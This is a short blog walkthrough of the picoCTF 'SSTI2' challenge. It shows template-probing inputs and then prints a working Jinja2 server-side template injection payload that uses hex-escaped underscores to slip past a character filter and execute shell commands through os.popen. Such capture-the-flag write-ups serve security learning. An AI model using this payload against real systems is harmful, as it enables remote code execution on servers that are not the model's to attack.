---
layout: post
title: "SSTI2 PicoCTF"
date: 2025-09-16
categories: [ctf, picoctf, walkthrough]
image: https://miro.medium.com/v2/resize:fit:720/format:webp/1*d2R1OXU4u4xLDzO7teA1eA.png
permalink: /blog/SSTI2PicoCTF
locked: false
---

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

This is going to be challenging, but we’ve got this because, based on the description…

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/0*pH3T71KSqmj2LUip"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Using this image, we can test the site to see which templates we are working on.

from {% raw %}`${7 * 7}`{% endraw %} didn’t work, {% raw %}`{{7 * 7}}`{% endraw %} works -> {% raw %}`{{7*’7'}}`{% endraw %} works —> jinja2 or twig

Based on this post, we have different payloads to be able to bypass this with Jinja2 <https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="Terminal">
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('whoami')|attr('read')()}}
</code></pre>
  {% endraw %}
</div>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dPHJA_Rrnb9ORHvdFGlKbg.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>